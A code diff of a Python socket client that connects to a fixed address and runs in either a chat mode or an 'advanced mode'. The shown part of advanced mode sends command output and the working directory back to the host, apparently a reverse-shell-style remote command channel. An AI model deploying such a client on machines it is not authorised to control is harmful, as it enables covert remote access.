@@ -5,8 +5,12 @@ from threading import *
 
 
 # "CONNECTED" IS USED TO CHECK IF CLIENT IS CONNECTED OR NOT
-global CONNECTED
+global CONNECTED, FIRST
+FIRST = True
 CONNECTED = True
+
+
+'''========================================= THREAD SEND FOR NORMAL MODE ============================================'''
 
 # DEFINATION OF CLASS "recive"
 class recive(Thread):
@@ -15,7 +19,8 @@ class recive(Thread):
 
                 try:
                         def reciving():
-                                
+
+                                # WHILE LOOP IS USED TO KEEP THE THREAD ALIVE UNTIL THE CONNECTION IS BROKEN
                                 while True:
 
                                         # INNITIALLY "CONNECTED" IS TRUE
@@ -30,7 +35,8 @@ class recive(Thread):
                                                         print("host exited")
                                                         CONNECTED = False
                                                 else:
-                                                        print(msg.decode())
+                                                        if CONNECTED:
+                                                                print(msg.decode())
 
                                         # BREAK OUT OF LOOP IF NOT CONNECTED TO SERVER
                                         if not CONNECTED:
@@ -43,9 +49,12 @@ class recive(Thread):
                 if CONNECTED:
                     reciving()
 
+
 # CREATING OBJECT FOR CLASS "recive"
 message_in = recive()
 
+
+'''========================================= THREAD SEND FOR NORMAL MODE ============================================'''
 
 # DEFINATION OF CLASS "send"
 class send(Thread):
@@ -59,9 +68,10 @@ class send(Thread):
                                         # INNITIALLY "CONNECTED" IS TRUE
                                         global CONNECTED
 
+                                        reply = input(">>>")
+
                                         # CHEACKING IF CLIENT IS CONNECTED TO SERVER OR NOT
-                                        if CONNECTED == True:
-                                                reply = input(">>>")
+                                        if CONNECTED:
 
                                                 # CLOSES THE CONNECTION IF "replay" IS "exit"
                                                 if reply == "exit":
@@ -85,6 +95,23 @@ class send(Thread):
 # CREATING OBJECT FOR CLASS "send"
 message_out = send()
 
+
+'''============================================= NORMAL MODE ========================================================'''
+
+# CLIENT WORKING IN NORMAL MODE
+def normal_mode():
+        print("operating in NORMAL MODE")
+
+        # INITIATING "recive" THREAD
+        message_in.start()
+
+        # INITIATING "send" THREAD
+        message_out.start()
+
+        message_in.join()
+        message_out.join()
+
+'''============================================= ADVANCE MODE ========================================================'''
 
 # CLIENT WORKING IN ADVANCED MODE
 def advanced_mode():
@@ -112,40 +139,36 @@ def advanced_mode():
                         s.send(str.encode(output_str + current_WorkingDir))
                         print(output_str)
 
-# CLIENT WORKING IN NORMAL MODE
-def normal_mode():
-                print("operating in NORMAL MODE")
 
-                # INITIATING "recive" THREAD
-                message_in.start()
-
-                # INITIATING "send" THREAD
-                message_out.start()
-
+'''================================================= STARTING CLIENT ================================================'''
 
 # STARTING CONNECTION WITH THE CLIENT
-def start_connection():
-        try:
-                global s
-                s = socket.socket()
-                host = "192.168.43.23"
-                port = 9999
+if FIRST:
+        def start_connection():
 
-                s.connect((host,port))
-        except:
-                print("trying to connect host....")
-                start_connection()
+                try:
+                        global s
+                        s = socket.socket()
+                        host = "192.168.43.23"
+                        port = 9999
 
-        # "opt"  CONTAINS THE MODE OF WORKING
-        opt = s.recv(1024).decode()
+                        s.connect((host, port))
+                except:
+                        print("trying to connect host....")
+                        start_connection()
 
-        # IF "opt" IS "1" INITIATE "normal mode"
-        if opt == '1':
-                normal_mode()
+                # "opt"  CONTAINS THE MODE OF WORKING
+                opt = s.recv(1024).decode()
 
-        # IF "opt" IS "2" INITIATE "advanced mode"
-        if opt == '2':
-                advanced_mode()
+                # IF "opt" IS "1" INITIATE "normal mode"
+                if opt == '1':
+                        normal_mode()
 
-# INITIATING CONNECTION
-start_connection()
+                # IF "opt" IS "2" INITIATE "advanced mode"
+                if opt == '2':
+                        advanced_mode()
+
+if FIRST:
+        # INITIATING CONNECTION
+        FIRST = False
+        start_connection()
